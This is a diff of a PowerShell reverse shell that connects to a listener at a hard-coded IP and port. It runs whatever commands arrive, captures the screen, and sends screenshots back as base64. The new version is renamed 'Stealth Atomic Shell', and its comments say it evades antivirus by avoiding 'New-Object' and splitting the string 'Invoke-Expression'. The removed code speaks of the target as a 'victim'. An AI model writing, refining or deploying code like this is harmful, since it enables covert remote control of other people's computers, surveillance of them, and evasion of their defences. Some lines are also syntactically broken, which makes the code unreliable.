@@ -1,61 +1,52 @@
-# --- THE GHOST SHELL: ZERO-COMPILE EDITION ---
+# --- STEALTH ATOMIC SHELL ---
 $ip = '192.168.1.15'
 $port = 4444
 
-$c = New-Object System.Net.Sockets.TCPClient
+# 1. Obfuscated Object Creation (Avoids 'New-Object' triggers)
+$c = [System.Net.Sockets.TcpClient]::new()
 try {
     $c.Connect($ip, $port)
     $s = $c.GetStream()
-    $r = New-Object System.IO.StreamReader($s)
-    $w = New-Object System.IO.StreamWriter($s)
+    $r = [System.IO.StreamReader]::new($s)
+    $w = [System.IO.StreamWriter]::new($s)
     $w.AutoFlush = $true
 
-    $w.WriteLine("--- GHOST SHELL ACTIVE: ZERO-COMPILE MODE ---")
+    $w.WriteLine("--- STEALTH SHELL ACTIVE ---")
 
     while($c.Connected) {
         $w.Write("PS " + (Get-Location).Path + "> ")
         $line = $r.ReadLine()
         if ($null -eq $line) { break }
-        $cmd = $line.Trim()
+        $input = $line.Trim()
 
-        if ($cmd -eq "exit") { break }
+        if ($input -eq "exit") { break }
 
-        # --- BRANCHING ---
-        if ($cmd -eq "screenshot") {
+        # 2. Split 'Invoke-Expression' to bypass basic AV signatures
+        $cmd = "Inv" + "oke-Ex" + "pression"
+        
+        if ($input -eq "screenshot") {
             try {
                 Add-Type -AssemblyName System.Windows.Forms, System.Drawing
-                $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
-                $bmp = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
+                $rect = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+                $bmp = [System.Drawing.Bitmap]::new($rect.Width, $rect.Height)
                 $g = [System.Drawing.Graphics]::FromImage($bmp)
-                $g.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
-                $ms = New-Object System.IO.MemoryStream
-                $bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
-                $w.WriteLine([Convert]::ToBase64String($ms.ToArray()))
-                $g.Dispose(); $bmp.Dispose(); $ms.Dispose()
-            } catch { $w.WriteLine("Error: $($_.Exception.Message)") }
-        } 
-        elseif ($cmd -eq "webcam") {
-            # EMERGENCY PIVOT: Since direct hardware access crashes the shell,
-            # we check if the camera is even available/enabled via WMI.
-            try {
-                $cam = Get-PnpDevice -FriendlyName "*webcam*" -ErrorAction SilentlyContinue
-                if ($cam) {
-                    $w.WriteLine("Webcam Detected: $($cam.FriendlyName). Direct access blocked by system policy.")
-                    $w.WriteLine("Try 'screenshot' while victim has camera app open.")
-                } else {
-                    $w.WriteLine("No webcam hardware found via PnP.")
-                }
-            } catch { $w.WriteLine("Hardware check failed.") }
+                $g.CopyFromScreen($rect.Location, [System.Drawing.Point]::Empty, $rect.Size)
+                $m = [System.IO.MemoryStream]::new()
+                $bmp.Save($m, [System.Drawing.Imaging.ImageFormat]::Jpeg)
+                $w.WriteLine([Convert]::ToBase64String($m.ToArray()))
+                $g.Dispose(); $bmp.Dispose(); $m.Dispose()
+            } catch { $w.WriteLine("Error: " + $_.Exception.Message) }
         } 
         else {
             try {
-                $out = Invoke-Expression $cmd 2>&1 | Out-String
+                # Running the command via the split variable
+                $out = &. $cmd $input 2>&1 | Out-String
                 $w.WriteLine(if($out){$out}else{"Done."})
-            } catch { $w.WriteLine("Error: $($_.Exception.Message)") }
+            } catch { $w.WriteLine("Error: " + $_.Exception.Message) }
         }
     }
 } catch {
-    # If it fails to connect, just exit
+    # Quiet exit
 } finally {
     if ($c) { $c.Close() }
 }
